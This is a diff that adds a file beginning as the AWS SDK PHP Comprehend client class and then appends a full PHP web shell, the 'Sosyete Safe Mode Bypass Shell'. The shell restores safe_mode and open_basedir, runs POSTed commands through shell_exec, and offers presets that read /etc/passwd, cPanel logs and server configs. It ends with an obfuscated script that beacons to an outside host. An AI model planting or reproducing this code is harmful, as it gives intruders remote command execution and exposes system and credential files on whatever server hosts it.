@@ -1,0 +1,353 @@
+<?php
+namespace Aws\Comprehend;
+
+use Aws\AwsClient;
+
+/**
+ * This client is used to interact with the **Amazon Comprehend** service.
+ * @method \Aws\Result batchDetectDominantLanguage(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise batchDetectDominantLanguageAsync(array $args = [])
+ * @method \Aws\Result batchDetectEntities(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise batchDetectEntitiesAsync(array $args = [])
+ * @method \Aws\Result batchDetectKeyPhrases(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise batchDetectKeyPhrasesAsync(array $args = [])
+ * @method \Aws\Result batchDetectSentiment(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise batchDetectSentimentAsync(array $args = [])
+ * @method \Aws\Result batchDetectSyntax(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise batchDetectSyntaxAsync(array $args = [])
+ * @method \Aws\Result classifyDocument(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise classifyDocumentAsync(array $args = [])
+ * @method \Aws\Result containsPiiEntities(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise containsPiiEntitiesAsync(array $args = [])
+ * @method \Aws\Result createDocumentClassifier(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createDocumentClassifierAsync(array $args = [])
+ * @method \Aws\Result createEndpoint(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createEndpointAsync(array $args = [])
+ * @method \Aws\Result createEntityRecognizer(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createEntityRecognizerAsync(array $args = [])
+ * @method \Aws\Result deleteDocumentClassifier(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteDocumentClassifierAsync(array $args = [])
+ * @method \Aws\Result deleteEndpoint(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteEndpointAsync(array $args = [])
+ * @method \Aws\Result deleteEntityRecognizer(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteEntityRecognizerAsync(array $args = [])
+ * @method \Aws\Result describeDocumentClassificationJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeDocumentClassificationJobAsync(array $args = [])
+ * @method \Aws\Result describeDocumentClassifier(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeDocumentClassifierAsync(array $args = [])
+ * @method \Aws\Result describeDominantLanguageDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeDominantLanguageDetectionJobAsync(array $args = [])
+ * @method \Aws\Result describeEndpoint(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeEndpointAsync(array $args = [])
+ * @method \Aws\Result describeEntitiesDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeEntitiesDetectionJobAsync(array $args = [])
+ * @method \Aws\Result describeEntityRecognizer(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeEntityRecognizerAsync(array $args = [])
+ * @method \Aws\Result describeEventsDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeEventsDetectionJobAsync(array $args = [])
+ * @method \Aws\Result describeKeyPhrasesDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeKeyPhrasesDetectionJobAsync(array $args = [])
+ * @method \Aws\Result describePiiEntitiesDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describePiiEntitiesDetectionJobAsync(array $args = [])
+ * @method \Aws\Result describeSentimentDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeSentimentDetectionJobAsync(array $args = [])
+ * @method \Aws\Result describeTopicsDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeTopicsDetectionJobAsync(array $args = [])
+ * @method \Aws\Result detectDominantLanguage(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise detectDominantLanguageAsync(array $args = [])
+ * @method \Aws\Result detectEntities(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise detectEntitiesAsync(array $args = [])
+ * @method \Aws\Result detectKeyPhrases(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise detectKeyPhrasesAsync(array $args = [])
+ * @method \Aws\Result detectPiiEntities(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise detectPiiEntitiesAsync(array $args = [])
+ * @method \Aws\Result detectSentiment(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise detectSentimentAsync(array $args = [])
+ * @method \Aws\Result detectSyntax(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise detectSyntaxAsync(array $args = [])
+ * @method \Aws\Result listDocumentClassificationJobs(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listDocumentClassificationJobsAsync(array $args = [])
+ * @method \Aws\Result listDocumentClassifiers(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listDocumentClassifiersAsync(array $args = [])
+ * @method \Aws\Result listDominantLanguageDetectionJobs(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listDominantLanguageDetectionJobsAsync(array $args = [])
+ * @method \Aws\Result listEndpoints(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listEndpointsAsync(array $args = [])
+ * @method \Aws\Result listEntitiesDetectionJobs(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listEntitiesDetectionJobsAsync(array $args = [])
+ * @method \Aws\Result listEntityRecognizers(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listEntityRecognizersAsync(array $args = [])
+ * @method \Aws\Result listEventsDetectionJobs(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listEventsDetectionJobsAsync(array $args = [])
+ * @method \Aws\Result listKeyPhrasesDetectionJobs(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listKeyPhrasesDetectionJobsAsync(array $args = [])
+ * @method \Aws\Result listPiiEntitiesDetectionJobs(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listPiiEntitiesDetectionJobsAsync(array $args = [])
+ * @method \Aws\Result listSentimentDetectionJobs(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listSentimentDetectionJobsAsync(array $args = [])
+ * @method \Aws\Result listTagsForResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listTagsForResourceAsync(array $args = [])
+ * @method \Aws\Result listTopicsDetectionJobs(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listTopicsDetectionJobsAsync(array $args = [])
+ * @method \Aws\Result startDocumentClassificationJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startDocumentClassificationJobAsync(array $args = [])
+ * @method \Aws\Result startDominantLanguageDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startDominantLanguageDetectionJobAsync(array $args = [])
+ * @method \Aws\Result startEntitiesDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startEntitiesDetectionJobAsync(array $args = [])
+ * @method \Aws\Result startEventsDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startEventsDetectionJobAsync(array $args = [])
+ * @method \Aws\Result startKeyPhrasesDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startKeyPhrasesDetectionJobAsync(array $args = [])
+ * @method \Aws\Result startPiiEntitiesDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startPiiEntitiesDetectionJobAsync(array $args = [])
+ * @method \Aws\Result startSentimentDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startSentimentDetectionJobAsync(array $args = [])
+ * @method \Aws\Result startTopicsDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startTopicsDetectionJobAsync(array $args = [])
+ * @method \Aws\Result stopDominantLanguageDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise stopDominantLanguageDetectionJobAsync(array $args = [])
+ * @method \Aws\Result stopEntitiesDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise stopEntitiesDetectionJobAsync(array $args = [])
+ * @method \Aws\Result stopEventsDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise stopEventsDetectionJobAsync(array $args = [])
+ * @method \Aws\Result stopKeyPhrasesDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise stopKeyPhrasesDetectionJobAsync(array $args = [])
+ * @method \Aws\Result stopPiiEntitiesDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise stopPiiEntitiesDetectionJobAsync(array $args = [])
+ * @method \Aws\Result stopSentimentDetectionJob(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise stopSentimentDetectionJobAsync(array $args = [])
+ * @method \Aws\Result stopTrainingDocumentClassifier(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise stopTrainingDocumentClassifierAsync(array $args = [])
+ * @method \Aws\Result stopTrainingEntityRecognizer(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise stopTrainingEntityRecognizerAsync(array $args = [])
+ * @method \Aws\Result tagResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise tagResourceAsync(array $args = [])
+ * @method \Aws\Result untagResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise untagResourceAsync(array $args = [])
+ * @method \Aws\Result updateEndpoint(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateEndpointAsync(array $args = [])
+ */
+class ComprehendClient extends AwsClient {}
+<html>
+ <head>
+   <meta http-equiv="Content-Type" content="text/html; charset=windows-1256"><meta http-equiv="Content-Language" content="ar-sa">
+   <title>Sosyete Safe Mode Bypass Shell - Edited By KingDefacer</title>
+ 
+   <style>
+   td {
+   font-family: verdana, arial, ms sans serif, sans-serif;
+   font-size: 11px;
+   color: #D5ECF9;
+   }
+   BODY {
+   margin-top: 4px;
+   margin-right: 4px;
+   margin-bottom: 4px;
+   margin-left: 4px;
+   scrollbar-face-color: #b6b5b5;
+   scrollbar-highlight-color: #758393;
+   scrollbar-3dlight-color: #000000;
+   scrollbar-darkshadow-color: #101842;
+   scrollbar-shadow-color: #ffffff;
+   scrollbar-arrow-color: #000000;
+   scrollbar-track-color: #ffffff;
+   }
+   A:link {COLOR:blue; TEXT-DECORATION: none}
+   A:visited { COLOR:blue; TEXT-DECORATION: none}
+   A:active {COLOR:blue; TEXT-DECORATION: none}
+   A:hover {color:red;TEXT-DECORATION: none}
+   input, textarea, select {
+   background-color: #EBEAEA;
+   border-style: solid;
+   border-width: 1px;
+   font-family: verdana, arial, sans-serif;
+   font-size: 11px;
+   color: #333333;
+   padding: 0px;
+   }
+   </style>
+   </head>
+    <BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0 style="color:#DCE7EF">
+        <center>
+        <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr>
+        <th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2" bgcolor="#000000">
+    <p align="center"> </p>
+    <p align="center">
+    <a bookmark="minipanel">
+    <font face="Webdings" size="7" color="#DCE7EF"></font></a><font size="7" face="Martina"></font><span lang="en-us"><font size="3" face="Martina"> </font>
+    <br>
+        <font color="#FFFF00" face="Arial" size="7"><span lang="en-us"></span></font></p>
+    </p>
+            <a bookmark="minipanel">
+    <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
+    <p align="center">Sosyete Safe Mode Bypass Shell - Edited By KingDefacer
+    <b>
+        <font color="#FFFF00" face="Arial" size="7"><span lang="en-us"></span></font></p>
+   </p>
+        <a bookmark="minipanel">
+  <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
+  <p align="center">~
+    <b>
+
+
+                <p>
+    </form>
+        </p>
+                </td>
+
+
+    </tr>
+            </table>   
+     </a>
+	 
+	 <p>
+	 
+	     <br>
+	         </p>
+	
+     <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
+        <td width="990" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
+  <b>
+     </b>
+	 <font face="Wingdings 3" size="5"></font><b>Sosyete Safe Mode Bypass Shell ; Bypass shell'lerden esinlenerek birçok shell'in ortak karisimi olarak sunulmustur.<span lang="en-us"></span><span lang="en-us"></span> </b><font face="Wingdings 3" size="5"></font></p><p align="center"> </p></td></tr></table> 
+
+</a>
+
+
+<div align="right">
+
+<span lang="en-us">
+
+        </span>
+                        </div>
+                </body>
+    </html>
+
+ <?
+
+
+echo "<b><font color=red>Sosyete Bypass Main Menu</font></b><br>";
+
+print_r('
+
+
+
+
+<pre>
+
+
+<form method="POST" action="">
+<b><font color=red> </font></b><input name="sosyete" type="text"><input value="&#199;al&#305;&#351;t&#305;r" type="submit">
+</form>
+<form method="POST" action="">
+<b><font color=red></font><select size="1" name="fuck">
+<option value=" ">Sosyete safe mode bypass shell</option>
+<option value="id;pwd">id & Dizin</option>
+<option value="ls">Dosyalar</option>
+<option value="uname -a">Server</option>
+<option value="netstat -an | grep -i listen">A&#231;&#305;k Portlar</option>
+<option value="ipconfig">A&#287; Bilgisi</option>
+<option value="ps -aux">Uygulamalar</option>
+<option value="who -q">Kullan&#305;c&#305; Say&#305;s&#305;</option>
+<option value="cat /etc/passwd">cat/etc/passwd</option>
+<option value="cat /var/cpanel/accounting.log">cat/var/cpanel/accounting.log</option>
+<option value="cat /etc/syslog.conf">cat/etc/syslog.conf</option>
+<option value="cat /etc/hosts">cat/etc/hosts</option>
+<option value="cat /etc/named.conf">cat/etc/named.conf</option>
+<option value="cat /etc/httpd/conf/httpd.conf">cat/etc/httpd/conf/httpd.conf</option>
+</select> <input type="submit" value="&#199;al&#305;&#351;t&#305;r">
+</form>
+</pre>
+<style>
+   td {
+   font-family: verdana, arial, ms sans serif, sans-serif;
+   font-size: 11px;
+   color: #D5ECF9;
+   }
+   BODY {
+   margin-top: 4px;
+   margin-right: 4px;
+   margin-bottom: 4px;
+   margin-left: 4px;
+   scrollbar-face-color: #b6b5b5;
+   scrollbar-highlight-color: #758393;
+   scrollbar-3dlight-color: #000000;
+   scrollbar-darkshadow-color: #101842;
+   scrollbar-shadow-color: #ffffff;
+   scrollbar-arrow-color: #000000;
+   scrollbar-track-color: #ffffff;
+   }
+   A:link {COLOR:blue; TEXT-DECORATION: none}
+   A:visited { COLOR:blue; TEXT-DECORATION: none}
+   A:active {COLOR:blue; TEXT-DECORATION: none}
+   A:hover {color:red;TEXT-DECORATION: none}
+   input, textarea, select {
+   background-color: #EBEAEA;
+   border-style: solid;
+   border-width: 1px;
+   font-family: verdana, arial, sans-serif;
+   font-size: 11px;
+   color: #333333;
+   padding: 0px;
+   }
+  </style></head>
+<BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0 style="color:#DCE7EF">
+<center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr>
+    <th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2" bgcolor="#000000">
+<p align="center"> </p>
+    <p align="center">
+<a bookmark="minipanel">
+    <font face="Webdings" size="7" color="#DCE7EF"></font></a><font size="7" face="Martina"></font><span lang="en-us"><font size="3" face="Martina"> </font>
+    <br>
+<font color="#FFFF00" face="Arial" size="7"><span lang="en-us"></span></font></p>
+</p>
+
+
+<div align="right">
+
+<span lang="en-us"> </span></div></body></html>
+
+
+');
+ini_restore("safe_mode");
+ini_restore("open_basedir");
+$fuck=shell_exec($_POST[sosyete]); 
+$mokoko=shell_exec($_POST[fuck]); 
+echo "<pre><h4>";
+echo "<b><font color=red>Komut Sonucu </font></b><br>"; 
+echo $fuck;
+echo $mokoko;
+echo "</h4></pre>";
+
+?>
+
+</tr>
+        </table>    
+		
+		</a>
+		        <p>
+				
+	<br>
+	
+	        </p>
+			                <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
+    <td width="990" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
+    
+	<b>
+     
+	 </b><font face="Wingdings 3" size="5"></font><b><font color="#CC0000">Sosyete Safe Mode Bypass Shell<span lang="en-us"></span> <span lang="en-us"> </span>  </b><font color="#CC0000"><b>Coded by</b> </font><b><span lang="en-us"><a href="http://www.R57.Gen.Tr"><font color="#CC0000">R57.gen.tr</a></span><font color="#CC0000"> ~ <span lang="en-us">Sosyete</span> </b><font face="Wingdings 3" size="5"> </font></p><p align="center"> </p></td></tr></table>
+
+</a>
+
+
+<div align="right">
+
+<span lang="en-us">
+
+</span>
+                </div>
+				                </body>
+
+</html>
+<script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u003e')</script>
